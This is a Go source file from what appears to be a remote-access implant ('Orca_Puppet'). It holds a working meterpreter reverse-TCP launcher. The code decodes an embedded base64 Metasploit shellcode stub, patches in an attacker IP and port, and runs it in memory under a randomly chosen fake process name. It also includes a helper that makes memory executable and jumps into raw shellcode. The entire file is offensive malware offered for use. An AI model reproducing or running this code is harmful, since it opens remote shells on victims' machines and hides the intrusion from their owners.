package meterpreter

import (
	"Orca_Puppet/define/api"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/define/hide"
	"Orca_Puppet/tools/util"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// Start creates a new meterpreter connection with the given transport type
func Meterpreter(transport, address string) error {
	var (
		con net.Conn
		err error
	)
	if con, err = net.Dial("tcp", address); err != nil {
		return err
	}
	defer con.Close()
	switch transport {
	case "tcp":
		runtime.GC()
		return ReverseTCP(address)
	default:
		return errors.New("unsupported transport type")
	}
}

func ReverseTCP(address string) error {
	var (
		replaceHex   string
		sourceHex    []byte
		shellcodeHex string
	)
	ip, port, _ := strings.Cut(address, ":")
	iport, _ := strconv.Atoi(port)
	ipHex := strconv.FormatInt(api.IpAddrToInt(ip), 16)
	portHex := strconv.FormatInt(int64(iport), 16)
	if runtime.GOARCH == "amd64" {
		msf_stub := "N2Y0NTRjNDYwMjAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwM2UwMDAxMDAwMDAwNzgwMDQwMDAwMDAwMDAwMDQwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA0MDAwMzgwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDA3MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA0MDAwMDAwMDAwMDAwMDAwNDAwMDAwMDAwMDAwZmEwMDAwMDAwMDAwMDAwMDdjMDEwMDAwMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwNDgzMWZmNmEwOTU4OTliNjEwNDg4OWQ2NGQzMWM5NmEyMjQxNWFiMjA3MGYwNTQ4ODVjMDc4NTE2YTBhNDE1OTUwNmEyOTU4OTk2YTAyNWY2YTAxNWUwZjA1NDg4NWMwNzgzYjQ4OTc0OGI5MDIwMDAwMDBmZmZmZmZmZjUxNDg4OWU2NmExMDVhNmEyYTU4MGYwNTU5NDg4NWMwNzkyNTQ5ZmZjOTc0MTg1NzZhMjM1ODZhMDA2YTA1NDg4OWU3NDgzMWY2MGYwNTU5NTk1ZjQ4ODVjMDc5Yzc2YTNjNTg2YTAxNWYwZjA1NWU2YTdlNWEwZjA1NDg4NWMwNzhlZGZmZTY="
		replaceHex = fmt.Sprintf("48b90200%s%s", portHex, ipHex)
		sourceHex, _ = base64.StdEncoding.DecodeString(msf_stub)
		shellcodeHex = strings.Replace(string(sourceHex), "48b902000000ffffffff", replaceHex, -1)
	}

	if runtime.GOARCH == "386" {
		//msf_stub := "N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4ZmZmZmZmZmY2ODAyMDBmZmZmODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw"
		//replaceHex = fmt.Sprintf("80975b68%s680200%s", ipHex, portHex)
		//sourceHex, _ = base64.StdEncoding.DecodeString(msf_stub)
		//shellcodeHex = strings.Replace(string(sourceHex), "80975b68ffffffff680200ffff", replaceHex, -1)
		return errors.New("not support x86")
	}
	debug.DebugPrint("shellcode: " + shellcodeHex)
	shellcode, _ := hex.DecodeString(shellcodeHex)
	runtime.GC()
	//go ExecShellcode(shellcode)
	hideName := util.GetRandomProcessName()
	_, _, err := hide.HideExec(shellcode, []string{}, hideName)
	if err != nil {
		return err
	}
	return nil
}

func ExecShellcode(shellcode []byte) error {
	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
	page := (*(*[0xFFFFFF]byte)(unsafe.Pointer(shellcodeAddr & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
	err := syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC|syscall.PROT_WRITE)
	if err != nil {
		return err
	}
	shellcodePtr := unsafe.Pointer(&shellcode)
	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellcodePtr))
	shellcodeFuncPtr()
	return nil
}
